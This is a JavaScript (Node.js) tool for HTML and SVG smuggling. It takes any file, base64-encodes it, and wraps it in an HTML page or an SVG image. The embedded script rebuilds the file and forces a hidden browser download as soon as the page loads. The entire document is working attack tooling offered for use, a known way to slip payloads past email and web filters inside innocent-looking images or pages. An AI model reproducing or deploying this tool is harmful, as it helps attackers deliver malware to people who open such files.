const fs = require('fs');

function base64Encode(plainText) {
    return Buffer.from(plainText).toString('base64');
}

function svgSmuggle(b64String, filename) {
    const obfuscatedB64 = b64String;
    const svgBody = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" width="100" height="100"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red"/><script><![CDATA[document.addEventListener("DOMContentLoaded",function(){function base64ToArrayBuffer(base64){var binary_string=atob(base64);var len=binary_string.length;var bytes=new Uint8Array(len);for(var i=0;i<len;i++){bytes[i]=binary_string.charCodeAt(i);}return bytes.buffer;}var file='${obfuscatedB64}';var data=base64ToArrayBuffer(file);var blob=new Blob([data],{type:'octet/stream'});var fileName='${filename}';var a=document.createElementNS('http://www.w3.org/1999/xhtml','a');document.documentElement.appendChild(a);a.setAttribute('style','display:none');var url=window.URL.createObjectURL(blob);a.href=url;a.download=fileName;a.click();window.URL.revokeObjectURL(url);});]]></script></svg>`;
    const [file2, file3] = filename.split('.');
    fs.writeFileSync(`smuggle-${file2}.svg`, svgBody);
}

function htmlSmuggle(b64String, filename) {
    const obfuscatedB64 = b64String;
    const htmlBody = `<html><body><script>function base64ToArrayBuffer(base64){var binary_string=atob(base64);var len=binary_string.length;var bytes=new Uint8Array(len);for(var i=0;i<len;i++){bytes[i]=binary_string.charCodeAt(i);}return bytes.buffer;}var file='${obfuscatedB64}';var data=base64ToArrayBuffer(file);var blob=new Blob([data],{type:'octet/stream'});var fileName='${filename}';if(window.navigator.msSaveOrOpenBlob){window.navigator.msSaveOrOpenBlob(blob,fileName);}else{var a=document.createElement('a');console.log(a);document.body.appendChild(a);a.style='display:none';var url=window.URL.createObjectURL(blob);a.href=url;a.download=fileName;a.click();window.URL.revokeObjectURL(url);}</script></body></html>`;
    const [file2, file3] = filename.split('.');
    fs.writeFileSync(`smuggle-${file2}.html`, htmlBody);
}

function printError(error) {
    console.error('\x1b[31m%s\x1b[0m', error);
}

function main(args) {
    try {
        let inputFile, outputType;
        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-i' && args[i + 1]) {
                inputFile = args[i + 1];
                i++;
            } else if (args[i] === '-o' && args[i + 1]) {
                outputType = args[i + 1];
                i++;
            }
        }

        if (!inputFile || !outputType) {
            printError("[-] Invalid arguments. Usage: node script.js -i inputFilePath -o outputType(svg/html)");
            return;
        }

        console.log("[+] Reading Data");
        const streamData = fs.readFileSync(inputFile);
        const b64Data = base64Encode(streamData);
        console.log("[+] Converting to Base64");

        console.log("[*] Smuggling in", outputType.toUpperCase());
        if (outputType === "html") {
            htmlSmuggle(b64Data, inputFile);
            console.log("[+] File Written to Current Directory...");
        } else if (outputType === "svg") {
            svgSmuggle(b64Data, inputFile);
            console.log("[+] File Written to Current Directory...");
        } else {
            printError("[-] Invalid output type. Only 'svg' and 'html' are supported.");
        }
    } catch (ex) {
        printError(ex.message);
    }
}

main(process.argv.slice(2));
